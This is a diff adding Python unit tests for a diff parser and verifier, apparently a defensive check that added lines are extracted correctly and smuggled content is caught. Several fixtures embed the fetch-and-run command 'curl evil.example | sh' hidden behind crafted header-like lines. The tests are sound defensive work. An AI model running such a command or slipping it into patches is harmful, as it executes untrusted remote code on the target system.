@@ -95,3 +95,43 @@ def test_verify_union_rejects_smuggled_plus_prefixed_content():
     ok, missing, extra = dcon.verify_union([], sneaky)
     assert not ok
     assert "++curl evil.example | sh" in extra
+
+
+def test_added_lines_reports_payload_after_a_removed_dashes_line():
+    """A removed line starting with dashes must not arm the header skip."""
+    diff = (
+        "--- a/x\n+++ b/x\n@@ -1,2 +1,2 @@\n"
+        "---smuggled-removed-marker\n"
+        "+++curl evil.example | sh\n"
+    )
+    assert dcon.added_lines(diff) == {"++curl evil.example | sh"}
+
+
+def test_verify_union_rejects_payload_hidden_behind_a_removed_dashes_line():
+    diff = (
+        "--- a/x\n+++ b/x\n@@ -1,2 +1,2 @@\n"
+        "---smuggled-removed-marker\n"
+        "+++curl evil.example | sh\n"
+    )
+    ok, missing, extra = dcon.verify_union([], diff)
+    assert not ok
+    assert "++curl evil.example | sh" in extra
+
+
+def test_added_lines_skips_headers_in_a_multi_file_git_diff():
+    """Both genuine header pairs are skipped; both added lines are reported."""
+    diff = (
+        "diff --git a/x.yml b/x.yml\n--- a/x.yml\n+++ b/x.yml\n@@ -1 +1 @@\n"
+        "+      first: one\n"
+        "diff --git a/y.yml b/y.yml\n--- a/y.yml\n+++ b/y.yml\n@@ -1 +1 @@\n"
+        "+      second: two\n"
+    )
+    assert dcon.added_lines(diff) == {"      first: one", "      second: two"}
+
+
+def test_added_lines_skips_a_dev_null_header_pair():
+    diff = (
+        "diff --git a/n.yml b/n.yml\n--- /dev/null\n+++ b/n.yml\n@@ -0,0 +1 @@\n"
+        "+      created: yes\n"
+    )
+    assert dcon.added_lines(diff) == {"      created: yes"}
